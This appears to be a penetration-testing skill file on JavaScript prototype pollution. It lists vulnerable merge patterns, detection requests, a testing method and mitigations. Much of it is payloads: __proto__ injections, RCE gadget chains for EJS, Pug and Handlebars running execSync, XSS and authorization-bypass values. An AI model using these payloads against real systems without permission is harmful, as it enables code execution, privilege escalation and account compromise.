---
name: prototype-pollution
description: JavaScript prototype pollution — __proto__, constructor.prototype, gadget chains, RCE via pollution
---

# Prototype Pollution

Prototype pollution is a JavaScript-specific vulnerability where an attacker can modify `Object.prototype`, affecting all objects in the application. It's widespread in Node.js applications using unsafe merge/clone/set operations.

## Attack Surface

**Vulnerable Operations**
- Deep merge/extend: `lodash.merge`, `lodash.defaultsDeep`, `jQuery.extend(true, ...)`
- Deep clone: custom recursive clone functions
- Property setting: `lodash.set`, `flat` package, path-based property assignment
- JSON parsing + object spread: `Object.assign({}, JSON.parse(userInput))`
- URL query parsing: `qs` library creates nested objects from `a[b][c]=value`

**Common Vulnerable Patterns**
```javascript
// Direct assignment via path
function setPath(obj, path, value) {
    const parts = path.split('.');
    let current = obj;
    for (let i = 0; i < parts.length - 1; i++) {
        current = current[parts[i]] = current[parts[i]] || {};
    }
    current[parts[parts.length - 1]] = value;
}
// Attack: setPath({}, "__proto__.admin", true)
// Now: ({}).admin === true for ALL objects
```

## Detection Techniques

### Server-Side (Node.js)

**JSON Body Pollution**
```json
POST /api/settings
Content-Type: application/json

{"__proto__": {"admin": true}}
```
```json
{"constructor": {"prototype": {"admin": true}}}
```

**URL Query String**
```
GET /api/data?__proto__[admin]=true
GET /api/data?__proto__.admin=true
GET /api/data?constructor[prototype][admin]=true
GET /api/data?constructor.prototype.admin=true
```

**Merge/Extend Pollution**
```json
POST /api/config
{
  "name": "test",
  "__proto__": {
    "shell": "/proc/self/exe",
    "NODE_OPTIONS": "--require /proc/self/environ"
  }
}
```

### Client-Side (Browser)

**DOM/URL-based**
```
https://target.com/#__proto__[innerHTML]=<img/src/onerror=alert(1)>
https://target.com/?__proto__[src]=data:,alert(1)
```

**PostMessage-based**
```javascript
// If target window receives messages and deep-merges them
window.postMessage({__proto__: {innerHTML: '<img src=x onerror=alert(1)>'}}, '*')
```

## Exploitation Gadget Chains

Polluting `Object.prototype` only matters if a downstream code path reads the polluted property. These are called "gadgets."

### RCE Gadgets (Node.js)

**child_process gadgets**
```json
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /proc/self/cmdline"}}
{"__proto__": {"shell": "/bin/bash", "env": {"NODE_OPTIONS": "--require=./rce.js"}}}
```

**EJS template engine**
```json
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}
```

**Pug template engine**
```json
{"__proto__": {"block": {"type": "Text", "val": "x]});process.mainModule.require('child_process').execSync('id')//"}}}
```

**Handlebars**
```json
{"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement", "params": [], "path": "constructor.constructor('return process.mainModule.require(\\'child_process\\').execSync(\\'id\\')')()"}]}}
```

### DoS Gadgets
```json
{"__proto__": {"toString": null}}
// Crashes any code doing String(obj) or template literals
```

### Authorization Bypass Gadgets
```json
{"__proto__": {"admin": true, "role": "admin", "isAdmin": true}}
// If code checks: if (user.admin) { ... }
```

### XSS Gadgets (Client-Side)
```json
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
{"__proto__": {"src": "javascript:alert(1)"}}
{"__proto__": {"href": "javascript:alert(1)"}}
```

## Testing Methodology

1. **Identify technology** — Is it Node.js/Express? Check `X-Powered-By`, response patterns
2. **Test basic pollution** — Send `{"__proto__": {"polluted": true}}` via JSON body
3. **Verify pollution** — If a subsequent endpoint returns a field `polluted: true` in any object → confirmed
4. **Alternative payloads** — Try `constructor.prototype` if `__proto__` is filtered
5. **Check impact** — Test known gadget chains for the technology stack
6. **Privilege escalation** — Try `{"__proto__": {"admin": true}}` and check account privileges

## Validation Criteria

- **Confirmed pollution** — demonstrate that a new property appears on unrelated objects after injection
- **Impact demonstration** — show privilege escalation, XSS, DoS, or RCE via gadget chain
- **Reproducible** — clear request sequence showing before/after state

## False Positive Indicators
- Application sanitizes `__proto__` and `constructor` keys before merge
- Using `Object.create(null)` for user-controlled data (no prototype)
- Using `Map` instead of plain objects
- Application ignores the polluted property (no gadget)

## Pro Tips
- **Try both `__proto__` and `constructor.prototype`** — different sanitization
- **Nested pollution** — `{"__proto__": {"__proto__": {"deep": true}}}` for recursive merge
- **Check npm dependencies** — known vulnerable packages: lodash (<4.17.12), flat, minimist, yargs-parser, qs
- **Server restart clears pollution** — prototype pollution is per-process, not persistent
- **Combine with SSTI** — if template engine uses polluted prototype, chain to RCE
